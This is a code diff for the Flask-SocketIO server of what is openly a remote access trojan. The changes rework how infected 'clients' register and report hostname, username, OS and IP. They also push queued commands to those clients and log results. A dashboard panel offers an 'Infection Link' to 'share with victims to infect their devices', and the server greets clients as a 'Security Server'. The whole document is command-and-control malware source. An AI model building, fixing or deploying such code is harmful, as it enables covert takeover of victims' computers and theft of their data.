@@ -781,50 +781,69 @@ def handle_stop_stream_command(data):
         
         emit('stream_stopped', {'client_id': client_id})
 
+# ============= FIXED REGISTER HANDLER =============
 @socketio.on('register')
 def handle_register(data):
-    client_id = data.get('id')
+    """Handle client registration - FIXED VERSION"""
+    # Extract data from the client registration
+    hostname = data.get('hostname', 'Unknown')
+    username = data.get('username', 'Unknown')
+    os_info = data.get('os', 'Unknown')
+    platform_info = data.get('platform', 'Unknown')
+    capabilities = data.get('capabilities', [])
     
-    if not client_id:
-        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}{time.time()}"
-        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
+    # Generate unique client ID
+    unique = f"{hostname}{username}{os_info}{time.time()}{request.sid}"
+    client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
     
+    # Store client info
     clients[client_id] = {
         'id': client_id,
-        'hostname': data.get('hostname', 'Unknown'),
-        'username': data.get('username', 'Unknown'),
-        'os': data.get('os', 'Unknown'),
-        'platform': data.get('platform', 'Unknown'),
+        'hostname': hostname,
+        'username': username,
+        'os': os_info,
+        'platform': platform_info,
         'ip': request.remote_addr,
         'online': True,
         'first_seen': time.time(),
         'last_seen': time.time(),
-        'capabilities': data.get('capabilities', [])
+        'capabilities': capabilities
     }
     
+    # Map socket ID to client ID
     client_sockets[client_id] = request.sid
+    
+    # Join the client room
     join_room(client_id)
     
-    print(f"[+] Client registered: {client_id} - {data.get('hostname')}")
+    print(f"[+] Client registered: {client_id} - {hostname} ({username})")
+    print(f"    OS: {os_info}")
+    print(f"    Platform: {platform_info}")
+    print(f"    IP: {request.remote_addr}")
+    print(f"    Capabilities: {capabilities}")
     
+    # Send welcome message to client
     emit('welcome', {
         'client_id': client_id,
         'message': 'Connected to Security Server',
         'timestamp': time.time()
     })
     
+    # Notify all controllers about new client
     socketio.emit('client_online', {
         'client_id': client_id,
-        'hostname': data.get('hostname'),
-        'username': data.get('username'),
-        'os': data.get('os'),
-        'platform': data.get('platform'),
+        'hostname': hostname,
+        'username': username,
+        'os': os_info,
+        'platform': platform_info,
         'ip': request.remote_addr,
         'online': True,
         'streaming': False
     })
     
+    # Process any pending commands for this client
     if client_id in pending_commands and pending_commands[client_id]:
+        print(f"[*] Sending {len(pending_commands[client_id])} pending commands to {client_id}")
         for cmd in pending_commands[client_id]:
             emit('command', cmd)
         pending_commands[client_id].clear()
@@ -842,7 +861,7 @@ def handle_result(data):
     cmd_id = data.get('command_id')
     client_id = data.get('client_id')
     
-    print(f"[*] Result from {client_id}")
+    print(f"[*] Result from {client_id}: {cmd_id}")
     
     result_data = {
         'command_id': cmd_id,
@@ -1421,7 +1440,7 @@ def dashboard_html():
                         <div class="infection-link">
                             <h3 style="color:#00aaff;margin-bottom:15px;">🔗 Infection Link</h3>
                             <p>Share this link with victims to infect their devices:</p>
-                            <input type="text" id="infection-url" readonly value="' + request.host_url + 'infect">
+                            <input type="text" id="infection-url" readonly>
                             <div style="display:flex;gap:10px;margin-top:15px;">
                                 <button onclick="copyInfectionLink()" class="btn btn-primary">Copy Link</button>
                                 <button onclick="testInfectionLink()" class="btn btn-success">Test Link</button>
